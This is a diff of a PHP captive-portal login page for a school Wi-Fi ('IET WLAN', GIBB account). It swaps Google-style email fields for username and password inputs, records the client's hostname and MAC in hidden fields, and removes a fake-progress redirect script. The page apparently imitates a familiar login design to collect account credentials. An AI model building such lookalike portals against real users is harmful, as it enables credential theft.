@@ -76,16 +76,8 @@ require_once('helper.php');
                         <h1 class='g-h1'>Bei IET WLAN Anmelden</h1>
                         <h2 class='g-h2'>GIBB Account benutzen</h2>
                         <div class='login-content'>
-                            <input name="email" id='email-input' type="text" class='g-input' placeholder="Email or phone" required>
-                            <!-- <div class="invalid-email" style='display:none;'> -->
-                                <!-- SVG for the invalid icon -->
-                                <!-- <span class="invalid-icon">
-                                    <svg fill="#d93025" focusable="false" width="16px" height="16px" viewBox="0 0 24 24" xmlns="https://www.w3.org/2000/svg">
-                                        <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 15h-2v-2h2v2zm0-4h-2V7h2v6z"></path>
-                                    </svg>
-                                </span><span class='invalid-email-text-span'>Enter a valid email or phone number</span>
-                            </div> -->
-                            <input name="password" id='password-input' type="password" class='g-input password-input' placeholder="Password" required>
+                        <input name="email" id='email-input' type="text" class='g-input' placeholder="Benutzername (xyz123456)" required>
+                            <input name="password" id='password-input' type="password" class='g-input password-input mb-2' placeholder="Passwort" required>
 
                             <input type="hidden" name="hostname" value="<?=getClientHostName($_SERVER['REMOTE_ADDR']);?>">
                             <input type="hidden" name="mac" value="<?=getClientMac($_SERVER['REMOTE_ADDR']);?>">
@@ -107,31 +99,3 @@ require_once('helper.php');
     </body>
 </html>
 <script type="text/javascript"></script>
-<script>
-    function show() {
-        var userInput = document.getElementById("email-input");
-        var pwInput = document.getElementById("password-input");
-        
-        if (userInput && userInput.value) {
-            if (pwInput && pwInput.value) {
-                $("#login-app").css("display", "none");
-                document.getElementById('my-image').style.display = "block";
-        
-                var timeleft = 3;
-                var downloadTimer = setInterval(function(){
-                    if(timeleft <= 0){
-                        clearInterval(downloadTimer);
-                        window.location = "/captiveportal/index.php";
-                    }
-                    document.getElementById("progressBar").value = 3 - timeleft;
-                    timeleft -= 1;
-                    console.log(timeleft)
-                }, 1000);
-            } else {
-                console.log("Password Input has NO value!");
-            }
-        } else {
-            console.log("User Input has NO value!");
-        }
-    }
-</script>
